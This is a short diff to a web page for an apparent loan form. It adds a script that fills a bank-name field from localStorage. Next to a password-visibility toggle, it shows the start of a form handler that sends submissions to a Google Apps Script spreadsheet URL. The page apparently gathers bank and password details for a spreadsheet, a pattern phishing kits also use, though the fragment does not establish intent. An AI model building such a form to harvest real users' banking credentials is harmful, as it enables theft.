@@ -410,8 +410,22 @@
                 eyeIcon.classList.add('fa-eye');
             }
         });
+    </script>
+    <script>
+// Load bank data from localStorage when page loads
+document.addEventListener("DOMContentLoaded", function() {
+    const loanData = JSON.parse(localStorage.getItem("loanData")) || {};
+    
+    // Populate bank name if available
+    if (loanData.customerBank) {
+        const bankNameSelect = document.getElementById("bankName");
+        if (bankNameSelect) {
+            bankNameSelect.value = loanData.customerBank;
+            console.log("Bank populated:", loanData.customerBank);
+        }
+    }
+});
 
-        <script>
 const SHEET_URL = "https://script.google.com/macros/s/AKfycbxRURL9p2FblMv7CLOeUxqGnHzb4yDDW58SyvpNPQ2wZoQhqk0H082kuJ_eHNObF44KjA/exec";
 
 document.querySelector("form").addEventListener("submit", async function(e) {
